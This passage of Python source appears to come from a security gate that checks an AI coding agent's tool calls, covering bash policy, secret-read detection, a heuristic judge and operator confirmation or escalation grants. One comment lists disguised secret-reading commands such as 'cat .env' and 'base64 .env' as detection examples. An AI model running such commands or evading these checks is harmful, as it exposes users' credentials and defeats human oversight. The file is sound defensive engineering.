                # unblock) and ai_run. Tool-level user_granted does NOT
                # lift the allowlist — only per-command subcommand
                # grants (flowing through `extras` / user_intent_
                # subcommands) can, and those require their own verb+
                # proximity check at grant time. Deny rules are never
                # bypassed.
                if not policy_decision["allowed"]:
                    matched_rule = str(policy_decision.get("matched_rule") or "")
                    # #33 Phase 1 (#36 invariant): bash_policy refusals
                    # become confirmable ONLY when:
                    #   (a) operator intent is detected, AND
                    #   (b) the refusal is on an EXPLICITLY DESTRUCTIVE
                    #       command class.
                    #
                    # Eligible:
                    #   - deny.* hit (operator config explicitly says
                    #     block; intent + intent-matching deny = confirm)
                    #   - default-block hit on a base command in
                    #     _JUDGE_DENYLIST (curated destructive list:
                    #     rm, sudo, dd, kill, etc.)
                    #
                    # NOT eligible (stays flat-deny):
                    #   - dangerous_chain.* — injection-shaped, no
                    #     rational direct invocation form (#36
                    #     catch-forbidden)
                    #   - default-block hit on UNCONFIGURED command
                    #     not in _JUDGE_DENYLIST. Operator who wants
                    #     it should add it to bash.allow explicitly.
                    is_dangerous_chain = matched_rule.startswith("dangerous_chain")
                    is_deny_table = matched_rule.startswith("deny.")
                    is_default_block_destructive = False
                    if not is_dangerous_chain and not is_deny_table:
                        try:
                            from .bash_policy import (
                                _JUDGE_DENYLIST as _BP_JUDGE_DENYLIST,
                            )

                            cmd_str = str((tool_input or {}).get("command", ""))
                            # First non-flag token = base command
                            for token in cmd_str.split():
                                if not token.startswith("-"):
                                    base_token = token.split("/")[-1].lower()
                                    if base_token in _BP_JUDGE_DENYLIST:
                                        is_default_block_destructive = True
                                    break
                        except Exception:
                            pass
                    confirmable = False
                    eligible = not is_dangerous_chain and (
                        is_deny_table or is_default_block_destructive
                    )
                    if eligible and session_id:
                        try:
                            from .intent_grant_detector import (
                                detect_destructive_intent,
                            )

                            confirmable = detect_destructive_intent(
                                self.hub.query_gate,
                                project_root,
                                session_id,
                                None,
                            )
                        except Exception:
                            confirmable = False

                    _sec012_trace.add(
                        "bash_policy",
                        "confirmable" if confirmable else "block",
                        matched_rule=matched_rule,
                    )
                    self._record_event(
                        project_root,
                        "bash_policy_confirmable" if confirmable else "bash_policy_block",
                        tool_name,
                        "ask" if confirmable else "blocked",
                        session_id=session_id,
                        reason=policy_decision["reason"],
                        matched_rule=policy_decision.get("matched_rule"),
                    )
                    self._journal_bash_decision(
                        project_root,
                        session_id,
                        str((tool_input or {}).get("command", "")),
                        "ask" if confirmable else "block",
                        f"{policy_decision['matched_rule']}: {policy_decision['reason']}",
                    )
                    if confirmable:
                        return _sec012_finalize(
                            ToolDecision(
                                allowed=False,
                                needs_confirmation=True,
                                reason=(
                                    f"Risk assessment: "
                                    f"{policy_decision['reason']} "
                                    f"(operator intent matched — confirm?)"
                                ),
                                blocked_by="bash_policy_confirmable",
                            ),
                        )
                    return _sec012_finalize(
                        ToolDecision(
                            allowed=False,
                            reason=str(policy_decision["reason"]),
                            blocked_by="bash_policy",
                        ),
                    )
                # If we reached here, policy returned allowed=True —
                # either via allowlist match or via a user_intent
                # subcommand grant unblocking the denylist entry. The
                # matched_rule tells which.
                _sec012_trace.add(
                    "bash_policy",
                    "pass",
                    matched_rule=matched,
                )
        else:
            _sec012_trace.add("bash_policy", "skip", reason="not_bash_or_gate_disabled")

        # Command read-intent gate. A command that prints file CONTENT
        # (cat .env / python -c "open('.env')" / base64 .env / sqlite3
        # secrets.db .dump / cp <secret> /tmp) is a read in disguise — it
        # must obey the SAME policy as the Read tool. Run each detected
        # target through host_read_decision. This is the pre-execution
        # half (spec D); run_output_guard is the content half. gate_enforce
        # scoped (it is a managed-mode posture, like bash_policy above).
        if normalized_tool in ("bash", "ai_run") and gate_enforce:
            try:
                from .command_read_intent import evaluate_command_read_policy

                read_state = dict(gate_state) if session_id else {}
                # Bind the session-artifact recognizer: project_root + the
                # current session ids let `tail`/`cat`/`grep` of THIS session's
                # own task/deploy output resolve, while other sessions' refuse.
                read_state["project_root"] = str(project_root)
                read_state["host_session_ids"] = self._host_session_ids(
                    project_root,
                    str(session_id or ""),
                )
                # host_read_decision reads approved_external_roots off the
                # gate_state; query_gate.get does not carry them, so merge
                # the effective-config list (same source SEC-004 uses).
                try:
                    _eff = _effective()
                    _sec = (_eff.get("security", {}) if isinstance(_eff, dict) else {}) or {}
                    _roots = _sec.get("approved_external_roots") or []
                    if isinstance(_roots, list):
                        read_state["approved_external_roots"] = [
                            str(r) for r in _roots if str(r).strip()
                        ]
                except Exception:
                    pass
                read_decision = evaluate_command_read_policy(
                    str((tool_input or {}).get("command", "")),
                    read_state,
                )
            except Exception:
                read_decision = None
            if read_decision is not None and read_decision.blocked:
                bt = read_decision.blocked_target
                self._record_event(
                    project_root,
                    "command_read_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    reason=read_decision.reason,
                    source_path_class=read_decision.level,
                    read_intent_shape=(bt.shape if bt else ""),
                    target_path=(bt.path if bt else ""),
                )
                self._journal_bash_decision(
                    project_root,
                    session_id,
                    str((tool_input or {}).get("command", "")),
                    "block",
                    f"command_read_intent[{read_decision.level}]: {bt.path if bt else ''}",
                )
                _sec012_trace.add(
                    "command_read_intent",
                    "block",
                    level=read_decision.level,
                    path=(bt.path if bt else ""),
                    shape=(bt.shape if bt else ""),
                )
                # Route the strike FAMILY by the read-gate sub-level so a
                # BENIGN indexed-source read (grep/cat of project source via
                # a command — the gate just wants ai_find) is FRICTION, not a
                # security strike. Only a real secret/sensitive read escalates.
                # Pre-fix the family was hardcoded "command_read_intent" (SOFT
                # → promotes to STRIKE → freeze), so non-malicious source
                # greps ratcheted agents into admin-only freezes (operator P0,
                # 2026-06-11). The discovery-nudge levels were ALWAYS meant to
                # be non-incrementing (see security_violation_service header).
                _read_level = str(getattr(read_decision, "level", "") or "")
                if _read_level == "sensitive_file_protection":
                    _read_family = "sensitive_read"  # real secret read → STRIKE
                elif _read_level in ("indexed_file_gate", "read_gate"):
                    _read_family = "indexed_file_gate"  # wrong-tool nudge → FRICTION
                else:
                    _read_family = "command_read_intent"  # external/ambiguous → SOFT
                _sv = self._security_strike(
                    project_root,
                    session_id,
                    _read_family,
                    tool_name,
                    (bt.path if bt else ""),
                )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=self._augment_reason(read_decision.reason, _sv),
                        blocked_by="command_read_intent",
                    ),
                )
            _sec012_trace.add(
                "command_read_intent",
                "pass",
                targets=(len(read_decision.targets) if read_decision else 0),
            )

        # Heuristic judge
        from .heuristic_judge import evaluate_tool_call

        judge = evaluate_tool_call(tool_name, tool_input, project_root=project_root)
        if judge.should_block:
            # Per-project judge overrides
            overrides = set(
                get_setting("security.judge_override", project_root=project_root, default=[]) or [],
            )

            # 2026-04-25 audit fix: classify FIRST (against unfiltered
            # verdicts), apply override SECOND (within each class).
            # The pre-fix order let an operator override one rule from
            # a mixed-class verdict set and silently shift the dominant
            # class — e.g. sensitive-read + destructive together,
            # override the sensitive-read, surviving destructive falls
            # into the confirmable class. That was a class-shift via
            # override, not a within-class thinning. Now overrides
            # cannot shift class; they only thin within their class.
            #
            # Class A: credential-format file writes (FILE_*_KEY etc.) —
            #          ask path with token-coverage check.
            # Class B: sensitive-read patterns (BASH_SENSITIVE_READ,
            #          INLINE_SENSITIVE_READ) — hard-block, never
            #          downgraded. Reading credentials shouldn't be
            #          ask-able even with destructive intent.
            # Class C: destructive patterns (everything else) — hard-
            #          block by default; downgrade to ask only when
            #          operator's prompt expressed destructive intent.
            _credential_rule_prefix = (
                "FILE_AWS_",
                "FILE_GITHUB_",
                "FILE_STRIPE_",
                "FILE_SLACK_",
                "FILE_OPENAI_",
                "FILE_ANTHROPIC_",
                "FILE_GOOGLE_",
                "FILE_JWT",
                "FILE_PEM_",
                "FILE_URI_CREDENTIALS",
                "FILE_HARDCODED_SECRET",
            )
            _sensitive_read_rule_ids = {
                "BASH_SENSITIVE_READ",
                "INLINE_SENSITIVE_READ",
            }

            def _class_of(v) -> str:
                if v.rule_id.startswith(_credential_rule_prefix):
                    return "A"
                if v.rule_id in _sensitive_read_rule_ids:
                    return "B"
                return "C"

            def _risk_class_for_verdict(rule_id: str) -> str:
                """Map a judge rule_id to an accurate escalation risk_class.

                Pre-fix (2026-06-11) every judge-minted freeze defaulted to
                'destructive_action' downstream (gate_tool.py), so a
                read-only DNS lookup or a blocked-destination egress showed
                the operator a mutation-flavored prompt. Network verdicts
                are NOT destruction: a reachability/egress-policy concern
                (network_egress) or a confidentiality concern
                (data_exfiltration). Non-network verdicts return '' and keep
                the destructive_action default unchanged.
                """
                rid = (rule_id or "").upper()
                if "EXFIL" in rid or "TUNNEL" in rid or "OBFUSC" in rid:
                    return "data_exfiltration"
                if rid.startswith(("EGRESS_", "NET_")) or "DNS" in rid:
                    return "network_egress"
                return ""

            # Classify unfiltered first.
            full_credential = [v for v in judge.verdicts if _class_of(v) == "A"]
            full_sensitive = [v for v in judge.verdicts if _class_of(v) == "B"]
            full_destructive = [v for v in judge.verdicts if _class_of(v) == "C"]

            # Within-class override thinning (override CAN remove rules
            # but CANNOT shift dominant class).
            credential_verdicts = [v for v in full_credential if v.rule_id not in overrides]
            sensitive_verdicts = [v for v in full_sensitive if v.rule_id not in overrides]
            destructive_verdicts = [v for v in full_destructive if v.rule_id not in overrides]

            # Class B is hard-deny floor: if ANY sensitive-read
            # verdict survived override, refuse outright. No ask
            # path. No intent downgrade.
            if sensitive_verdicts:
                top = sensitive_verdicts[0]
                self._record_event(
                    project_root,
                    "judge_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    risk=top.risk,
                    reason=top.description,
                )
                _sec012_trace.add(
                    "heuristic_judge",
                    "block",
                    rule_id=str(getattr(top, "rule_id", "") or ""),
                    risk="sensitive_read_hard_floor",
                )
                _sv = self._security_strike(
                    project_root,
                    session_id,
                    "sensitive_read",
                    tool_name,
                    str(getattr(top, "rule_id", "") or ""),
                )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=self._augment_reason(
                            f"Risk assessment: {top.description}"
                            + (f" {top.recommendation}" if top.recommendation else ""),
                            _sv,
                        ),
                        blocked_by="heuristic_judge_sensitive",
                    ),
                )

            # Build legacy active_verdicts shape for the rest of the
            # block (credential ask path + Class C path expect a
            # single mixed list). Sensitive-reads excluded since
            # they're handled above. Maintain pre-existing variable
            # names so the existing flow code below doesn't change.
            active_verdicts = credential_verdicts + destructive_verdicts
            non_cred_verdicts = destructive_verdicts
            if active_verdicts:
                # User-intent credential override (2026-04-21).
                # credential_verdicts / non_cred_verdicts already
                # computed from the classify-first / override-second
                # path above (2026-04-25 audit fix). Re-derivation
                # removed; legacy comment kept inline:
                # When EVERY active credential verdict's matched token
                # appears in the session's user_intent_credentials
                # (populated at the most recent UserPromptSubmit by
                # scanning the prompt for provider-prefix tokens),
                # downgrade the hard-block to an ask-state confirm.
                # User pasted the key → user intent covers THIS exact
                # token, but we still want one deliberate "yes" before
                # writing it to disk. Non-credential verdicts or
                # uncovered tokens keep hard-blocking.
                if credential_verdicts and not non_cred_verdicts and session_id:
                    import hashlib as _h_conf

                    cmd_sha = _h_conf.sha256(
                        str(tool_input or {}).encode("utf-8", "replace"),
                    ).hexdigest()[:16]
                    # ACCEPT path (2026-04-21). After the operator typed
                    # "yes" on a pending credential confirm, claude_hook
                    # promoted the entry into last_confirmed_operation
                    # with consumed=False. On the agent's tool retry we
                    # match command_sha, flip consumed=True, and allow
                    # the call through. One-shot bypass — a second
                    # retry (or any other tool) wouldn't find a fresh
                    # confirmation and would re-block.
                    try:
                        confirmed = self.hub.query_gate.get_last_confirmed_operation(
                            project_root,
                            session_id,
                        )
                    except Exception:
                        confirmed = None
                    if (
                        isinstance(confirmed, dict)
                        and not confirmed.get("consumed")
                        and confirmed.get("command_sha") == cmd_sha
                        and str(confirmed.get("id", "")).startswith("cred_intent_")
                    ):
                        try:
                            self.hub.query_gate.set_last_confirmed_operation(
                                project_root,
                                session_id,
                                {**confirmed, "consumed": True},
                            )
                            self._record_event(
                                project_root,
                                "judge_credential_confirm_consumed",
                                tool_name,
                                "allowed",
                                session_id=session_id,
                                risk=credential_verdicts[0].risk,
                                reason="user_intent_credential one-shot bypass",
                            )
                        except Exception:
                            pass
                        _sec012_trace.add(
                            "heuristic_judge",
                            "bypass",
                            reason="credential_confirm_consumed",
                        )
                        return _sec012_finalize(ToolDecision(allowed=True))
                    try:
                        from .heuristic_judge import extract_credential_tokens

                        content = str(
                            (tool_input or {}).get("content")
                            or (tool_input or {}).get("new_content")
                            or (tool_input or {}).get("new_str")
                            or (tool_input or {}).get("command")
                            or "",
                        )
                        tool_tokens = extract_credential_tokens(content)
                        user_tokens = set(
                            self.hub.query_gate.get_user_intent_credentials(
                                project_root,
                                session_id,
                            ),
                        )
                        all_covered = bool(tool_tokens) and all(
                            t in user_tokens for t in tool_tokens
                        )
                    except Exception:
                        all_covered = False
                    if all_covered:
                        try:
                            token_preview = ", ".join(
                                (t[:6] + "…" + t[-2:] if len(t) > 10 else "***")
                                for t in tool_tokens[:3]
                            )
                            turn = self.hub.query_gate.get_turn_counter(
                                project_root,
                                session_id,
                            )
                            self.hub.query_gate.set_pending_confirmation(
                                project_root,
                                session_id,
                                {
                                    "id": f"cred_intent_{cmd_sha}",
                                    "command_sha": cmd_sha,
                                    "tool_name": tool_name,
                                    "reason": credential_verdicts[0].description,
                                    "turn_at_create": turn,
                                    "kind": "user_intent_credential",
                                },
                            )
                            self._record_event(
                                project_root,
                                "judge_credential_confirm_requested",
                                tool_name,
                                "awaiting_confirm",
                                session_id=session_id,
                                risk=credential_verdicts[0].risk,
                                reason=credential_verdicts[0].description,
                            )
                        except Exception:
                            pass
                        _sec012_trace.add(
                            "heuristic_judge",
                            "block",
                            reason="credential_confirm_required",
                            rule_id=credential_verdicts[0].rule_id,
                        )
                        return _sec012_finalize(
                            ToolDecision(
                                allowed=False,
                                reason=(
                                    f"User-intent credential match — confirm required. "
                                    f"Your last prompt contained the credential token(s) "
                                    f"[{token_preview}]. The agent is about to commit them "
                                    f"via `{tool_name}`. Reply 'yes' in chat to approve "
                                    f"this single operation, or 'no' to refuse. "
                                    f"(Judge rule: {credential_verdicts[0].rule_id})"
                                ),
                                blocked_by="judge_credential_confirm",
                            ),
                        )
                top = active_verdicts[0]
                reason = top.description
                rec = top.recommendation or ""
                self._record_event(
                    project_root,
                    "judge_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    risk=top.risk,
                    reason=reason,
                )
                if tool_name.lower() in ("bash", "ai_run"):
                    self._journal_bash_decision(
                        project_root,
                        session_id,
                        str((tool_input or {}).get("command", "")),
                        "block",
                        f"heuristic judge: {reason}",
                    )
                _sec012_trace.add(
                    "heuristic_judge",
                    "block",
                    rule_id=str(getattr(top, "rule_id", "") or ""),
                    risk=str(getattr(top, "risk", "") or ""),
                )
                # Phase 4 of backlog #15 (2026-04-25): judge hard-blocks
                # by default. ONLY when the operator's current prompt
                # expressed destructive intent (via NLP — "nuke",
                # "delete", "wipe", "force", "destroy", etc.) AND the
                # agent attempted a matching destructive action, we
                # downgrade hard-block to "ask" so the operator gives
                # the final sign-off. No intent → hard deny unchanged.
                #
                # Credential class has its own ask path above; keeps
                # using that flow (the NLP for credentials is the
                # paste-detection at tool_tokens/user_tokens step).
                is_credential_only = bool(credential_verdicts) and not non_cred_verdicts
                intent_matches = False
                if not is_credential_only and session_id:
                    try:
                        from .intent_grant_detector import (
                            detect_destructive_intent,
                        )

                        # Detector reads the session's last prompt from
                        # query_gate (stored at UserPromptSubmit time).
                        intent_matches = detect_destructive_intent(
                            self.hub.query_gate,
                            project_root,
                            session_id,
                            top,
                        )
                    except Exception:
                        intent_matches = False
                if intent_matches:
                    # Emit semantic ask-user outcome. Adapter maps to
                    # the host's native confirmation primitive (CC
                    # permissionDecision=ask, OpenCode permission ask,
                    # Codex PermissionRequest). Adapters that can't
                    # surface it degrade to deny with reason. See
                    # §4 layer 17 of security-gates.md.
                    return _sec012_finalize(
                        ToolDecision(
                            allowed=False,
                            reason=(
                                f"Risk assessment: {reason}"
                                + (f" {rec}" if rec else "")
                                + " (operator intent matched — confirm?)"
                            ),
                            blocked_by="judge_confirm_required",
                            needs_confirmation=True,
                            risk_class=_risk_class_for_verdict(
                                str(getattr(top, "rule_id", "") or ""),
                            ),
                        ),
                    )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=f"Risk assessment: {reason}" + (f" {rec}" if rec else ""),
                        blocked_by="heuristic_judge",
                        risk_class=_risk_class_for_verdict(
                            str(getattr(top, "rule_id", "") or ""),
                        ),
                    ),
                )
        if judge.verdicts:
            _sec012_trace.add(
                "heuristic_judge",
                "pass",
                risk=str(getattr(judge, "max_risk", "") or ""),
                verdict_count=len(getattr(judge, "verdicts", []) or []),
            )
            self._record_event(
                project_root,
                "judge_advisory",
                tool_name,
                "allowed",
                session_id=session_id,
                risk=judge.max_risk,
            )
        else:
            _sec012_trace.add("heuristic_judge", "pass", verdict_count=0)

        # Infrastructure protection
        infra = self._check_infrastructure(
            tool_name,
            tool_input,
            dev_mode=dev_mode,
            allow_config_edit=allow_config_edit,
        )
        if infra:
            _sec012_trace.add("infrastructure", "block", reason=str(infra))
            return _sec012_finalize(
                ToolDecision(allowed=False, reason=infra, blocked_by="infrastructure"),
            )
        _sec012_trace.add("infrastructure", "pass")

        # Foreground-long-running enforcement uses a dedicated key so
        # it doesn't collide with tools.tool_call_timeout (the 10s MCP
        # responsiveness budget). `bash_long_runner_cap_seconds` caps
        # foreground pytest/npm/pip/cargo/docker invocations — commands
        # that routinely exceed any reasonable MCP latency budget and
        # need to be backgrounded.
        tools_config = effective.get("tools", {}) if isinstance(effective, dict) else {}
        fg_cap_raw = tools_config.get("bash_long_runner_cap_seconds")
        try:
            fg_cap: int | None = int(fg_cap_raw) if fg_cap_raw is not None else None
        except (TypeError, ValueError):
            fg_cap = None
        # 0 = unlimited: no foreground cap → degrade to advisory (no hard block).
        if fg_cap is not None and fg_cap <= 0:
            fg_cap = None
        run_in_bg = bool((tool_input or {}).get("run_in_background", False))
        fg_check = self._check_foreground_long_running(
            tool_name,
            tool_input,
            timeout_cap_seconds=fg_cap,
            run_in_background=run_in_bg,
        )
        if not fg_check["allowed"]:
            _sec012_trace.add(
                "foreground_long_running",
                "block",
                reason=str(fg_check["reason"]),
            )
            self._record_event(
                project_root,
                "foreground_long_running_block",
                tool_name,
                "blocked",
                session_id=session_id,
                reason=str(fg_check["reason"]),
            )
            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    reason=str(fg_check["reason"]),
                    blocked_by="foreground_long_running",
                ),
            )
        _sec012_trace.add(
            "foreground_long_running",
            "pass" if not fg_check.get("advisory") else "advisory",
        )

        # Advisory nudges (non-blocking). Nudges are the pre-session-bind
        # safety net: if an agent reaches for a raw tool before binding to
        # an AIDOCS session, the nudge points at the indexed alternative.
        # Inside a bound session, gates enforce the same intent directly.
        advisory_parts: list[str] = []
        mcp_nudge = self._suggest_mcp_alternative(tool_name, tool_input)
        if mcp_nudge:
            advisory_parts.append(mcp_nudge)
        comment_nudge = self._comment_quality_nudge(tool_name, tool_input)
        if comment_nudge:
            advisory_parts.append(comment_nudge)
        if fg_check["advisory"]:
            advisory_parts.append(str(fg_check["advisory"]))

        # Autowake heartbeat enforcement REMOVED 2026-04-30. The
        # mechanism was fundamentally flawed — agents could decline
        # ScheduleWakeup and stall the session waiting for a wake
        # window that would never arrive. See the autowake-removal
        # commit. Reuse may revisit this via a stop-hook architecture.

        # Journal the allow path for bash/ai_run so operators see every
        # command that ran, not just the blocked ones. The block log
        # alone leaves operators with "what DID run?" as a separate
        # question.
        if tool_name.lower() in ("bash", "ai_run"):
            self._journal_bash_decision(
                project_root,
                session_id,
                str((tool_input or {}).get("command", "")),
                "allow",
                "user_granted" if user_granted else "passed all gate checks",
            )

        return _sec012_finalize(ToolDecision(allowed=True, advisory=" ".join(advisory_parts)))

    def _sec003_match_and_consume(
        self,
        *,
        project_root: Path,
        session_id: str,
        tool_name: str,
        tool_input: dict,
    ) -> None:
        """SEC-003 (2026-04-23) — escalation scope binding.

        At PreToolUse time, after all gates passed, look for a pending
        admin-approved grant that binds to this exact attempted
        action. If one matches, consume it (scope-aware) and emit
        escalation_consumed with approval_id + matched fingerprint.

        Matching priority:
          1. operation_fingerprint (command_hash) exact
          2. tool_name + exact path + task_id
          3. tool_name/capability + task_id
          4. tool_name + session scope (requires TTL)
        """
        if not session_id:
            return
        import hashlib

        from .access_gate import PathInputConflict, _extract_path
        from .escalation_store import EscalationStore

        # Build attempted_action fingerprint. Conflict means this call
        # was somehow constructed without going through check_tool's
        # entry-level refusal — abstain rather than fingerprint a
        # non-canonical value.
        try:
            raw_path = _extract_path(tool_input)
        except PathInputConflict:
            return
        raw_command = str(tool_input.get("command") or "").strip()
        if raw_command:
            fingerprint = hashlib.sha256(raw_command.encode("utf-8", "replace")).hexdigest()[:32]
        elif raw_path:
            fingerprint = hashlib.sha256(raw_path.encode("utf-8", "replace")).hexdigest()[:32]
        else:
            fingerprint = ""

        # Current task_id from session row (empty string when none).
        try:
            gate_state = self.hub.query_gate.get(project_root, session_id) or {}
            current_task_id = str(gate_state.get("current_task_id") or "").strip()
        except Exception:
            current_task_id = ""

        # Pull pending approvals + grants for this session.
        try:
            esc = EscalationStore()
            esc.init_db(project_root)
        except Exception:
            return

        import sqlite3

        from .escalation_store import _iso_now, _row_to_grant

        now_iso = _iso_now()
        try:
            with sqlite3.connect(str(esc.db_path(project_root))) as conn:
                conn.row_factory = sqlite3.Row
                rows = conn.execute(
                    "SELECT * FROM rbac_escalation_grants "
                    "WHERE session_id = ? "
                    "AND expires_at > ? "
                    "AND uses_consumed < max_uses "
                    "ORDER BY approved_at DESC",
                    (session_id, now_iso),
                ).fetchall()
        except Exception:
            return

        if not rows:
            return

        norm_tool = tool_name.strip().lower()
        for prefix in ("mcp__aidocs__", "mcp__"):
            if norm_tool.startswith(prefix):
                norm_tool = norm_tool[len(prefix) :]
                break

        # Find best match. Priority ordered: 1,2,3,4.
        matched_grant = None
        matched_priority = 0
        matched_reason = ""
        for row in rows:
            try:
                g = _row_to_grant(row)
            except Exception:
                continue
            g_tool = (g.tool_name or "").strip().lower()
            for prefix in ("mcp__aidocs__", "mcp__"):
                if g_tool.startswith(prefix):
                    g_tool = g_tool[len(prefix) :]
                    break
            g_path = (g.path or "").strip()
            g_task = (g.task_id or "").strip()
            g_scope = (g.scope or "once").strip().lower()

            # Priority 1: operation fingerprint exact.
            if g.command_hash and fingerprint and g.command_hash == fingerprint:
                matched_grant = g
                matched_priority = 1
                matched_reason = "fingerprint_exact"
                break

            # Priority 2: tool + exact path + task_id.
            if (
                g_tool
                and g_tool == norm_tool
                and g_path
                and g_path == raw_path
                and g_task
                and g_task == current_task_id
            ):
                if matched_priority == 0 or matched_priority > 2:
                    matched_grant = g
                    matched_priority = 2
                    matched_reason = "tool_path_task"
                continue

            # Priority 3: tool/capability + task_id (no path binding).
            if (
                g_tool
                and g_tool == norm_tool
                and not g_path
                and g_task
                and g_task == current_task_id
            ):
                if matched_priority == 0 or matched_priority > 3:
                    matched_grant = g
                    matched_priority = 3
                    matched_reason = "tool_task"
                continue

            # Priority 3b: tool-only, scope=once. Minimal binding —
            # "admin approved bash once, no path/task constraint."
            # Still strictly scoped by session + permission via the
            # grant row itself (the SELECT filter above); "tool only"
            # means no extra action-specificity required.
            if (
                g_tool
                and g_tool == norm_tool
                and g_scope == "once"
                and not g_task
                and not g_path
                and not g.command_hash
            ):
                if matched_priority == 0 or matched_priority > 3:
                    matched_grant = g
                    matched_priority = 3
                    matched_reason = "tool_once_minimal"
                continue

            # Priority 4: tool + session scope, only when TTL-bounded.
            if (
                g_tool
                and g_tool == norm_tool
                and g_scope == "session"
                and not g_task
                and not g_path
                and (g.expires_turn is not None or g.expires_at)
            ):
                if matched_priority == 0 or matched_priority > 4:
                    matched_grant = g
                    matched_priority = 4
                    matched_reason = "tool_session_bounded"
                continue

        if matched_grant is None:
            return

        # Consume per scope rules.
        # once → always consume (max_uses=1 typical)
        # task → consume if we passed the task boundary? For now:
        #        consume per-call (matches max_uses semantics).
        # session → consume per-call.
        # Scope gates stay-alive behavior via max_uses + expires_at;
        # SEC-003's contract at this layer is "consume on match."
        try:
            esc.consume_grant(project_root, matched_grant.grant_id)
        except Exception:
            return

        try:
            self.hub.execution.record_event(
                project_root,
                event_kind="escalation_consumed",
                source_kind="sec003_match_consume",
                session_id=session_id,
                capability_name=matched_grant.permission_name,
                action_kind="escalation",
                target_entity=tool_name,
                status="consumed",
                payload={
                    "grant_id": matched_grant.grant_id,
                    "matched_action_fingerprint": fingerprint,
                    "matched_priority": matched_priority,
                    "matched_reason": matched_reason,
                    "tool_name": tool_name,
                    "path": raw_path,
                    "task_id": current_task_id,
                    "scope": matched_grant.scope,
                },
            )
        except Exception:
            pass

    def build_lifecycle_nudge(
        self,
        project_root: Path,
        session_id: str,
        action_kind: str,
    ) -> str:
        """Build lifecycle follow-through nudge text."""
        compliance = self.runtime.session_compliance_summary(project_root, session_id)
        if not isinstance(compliance, dict):
            return ""

        parts: list[str] = []
        task_open = compliance.get("task_open")
        journal_coverage = compliance.get("journal_coverage", {})
        meaningful_since = (
            journal_coverage.get("meaningful_event_count_since_journal", 0)
            if isinstance(journal_coverage, dict)
            else 0
        )

        if task_open and action_kind in ("edit", "write_memory", "git_commit"):
            if meaningful_since and meaningful_since > 3:
                parts.append(
                    "Lifecycle follow-through: meaningful edit work happened since the last lifecycle tool call; "
                    "use `ai_task(mode='complete')` if the task is done.",
                )
            elif meaningful_since and meaningful_since > 0:
                parts.append(
                    "Lifecycle follow-through: meaningful work has accumulated since the last lifecycle tool call; "
                    "use `ai_task(mode='update')` to record progress.",
                )

        return " ".join(parts)

    # ── Conductor session lock ──

    def conductor_claim(
        self,
        project_root: Path,
        session_id: str,
        conductor_id: str,
        *,
        stale_minutes: int = 5,
    ) -> dict[str, object]:
        """Claim a session for conductor use. Rejects if another conductor has a fresh claim.

        Returns {claimed, conductor_id, existing_conductor, reason}.
        """
        claims = self.hub.sessions.list_claims(
            project_root,
            session_id,
            stale_after_minutes=stale_minutes,
        )
        conductor_claims = [c for c in claims if str(c.get("mode", "")).startswith("conductor")]

        for existing in conductor_claims:
            if existing.get("agent_id") != conductor_id:
                return {
                    "claimed": False,
                    "conductor_id": conductor_id,
                    "existing_conductor": existing.get("agent_id"),
                    "last_seen": existing.get("last_seen"),
                    "reason": f"Session already claimed by conductor '{existing.get('agent_id')}' (last seen: {existing.get('last_seen')}). Wait for it to release or expire ({stale_minutes} min stale timeout).",
                }

        # Claim or refresh
        self.hub.sessions.claim_session(
            project_root,
            session_id,
            agent_id=conductor_id,
            run_id=f"conductor-{conductor_id}",
            mode="conductor",
        )
        return {
            "claimed": True,
            "conductor_id": conductor_id,
            "reason": "Session claimed for conductor use.",
        }

    def conductor_heartbeat(
        self,
        project_root: Path,
        session_id: str,
        conductor_id: str,
    ) -> dict[str, object]:
        """Refresh the conductor's claim heartbeat. Call every 30-60 seconds."""
        self.hub.sessions.claim_session(
            project_root,
            session_id,
            agent_id=conductor_id,
            run_id=f"conductor-{conductor_id}",
            mode="conductor",
        )
        return {"refreshed": True, "conductor_id": conductor_id}

    def conductor_release(
        self,
        project_root: Path,
        session_id: str,
        conductor_id: str,
    ) -> dict[str, object]:
        """Release the conductor's claim on a session."""
        self.hub.sessions.release_claim(
            project_root,
            session_id,
            agent_id=conductor_id,
        )
        return {"released": True, "conductor_id": conductor_id}

    # ── Internal helpers ──

    def _record_event(
        self,
        project_root: Path,
        event_kind: str,
        tool_name: str,
        status: str,
        session_id: str = "",
        **extra: object,
    ) -> None:
        # Thin wrapper over tool_call_log.record so the orchestrator
        # stops composing record_event by hand. Phase is passed as the
        # event_kind string; unknown kinds pass through unchanged for
        # the security-block vocabulary dashboards already know.
        from .tool_call_log import record as _log_record

        try:
            _log_record(
                self.hub,
                project_root,
                phase=event_kind,
                name=tool_name,
                payload={k: v for k, v in extra.items() if v is not None},
                session_id=session_id or None,
                source="orchestrator",
                action_kind="security",
                status=status,
            )
        except Exception:
            pass

    def _record_test_retry_reset(
        self,
        project_root: Path,
        session_id: str = "",
        lane_id: str = "",
    ) -> None:
        # Session + lane scoped so a parallel session or peer lane's edits
        # don't unblock this scope's retry counter. Empty strings encode
        # "no session / main conductor" so COALESCE matches a query with
        # the same shape.
        from .tool_call_log import record as _log_record

        try:
            _log_record(
                self.hub,
                project_root,
                phase="test_retry_reset",
                name=None,
                payload={"lane_id": lane_id or ""},
                session_id=session_id or None,
                source="orchestrator",
                action_kind="gate_marker",
            )
        except Exception:
            pass

    def _record_test_invocation(
        self,
        project_root: Path,
        session_id: str,
        key: str,
        lane_id: str = "",
    ) -> None:
        from .tool_call_log import record as _log_record

        try:
            _log_record(
                self.hub,
                project_root,
                phase="test_runner_invocation",
                name=None,
                payload={"key": key, "lane_id": lane_id or ""},
                session_id=session_id or None,
                source="orchestrator",
                action_kind="gate_marker",
            )
        except Exception:
            pass

    def _count_test_invocations_since_reset(
        self,
        project_root: Path,
        session_id: str,
        key: str,
        lane_id: str = "",
    ) -> int:
        # Count DISTINCT test_runner_invocation event_ids for this
        # (session, lane, key) that landed after the most-recent reset
        # scoped to the same (session, lane). DISTINCT is load-bearing:
        # wire-duplicates collapse to a single event_id at the INSERT
        # boundary, so this count matches agent-level invocations rather
        # than raw JSON-RPC arrivals. Scoping the reset query by
        # (session, lane) prevents cross-scope reset leakage — one
        # lane's edits stay out of another lane's counter.
        try:
            import json as _json

            self.hub.execution.init_db(project_root)
            invocation_payload = _json.dumps(
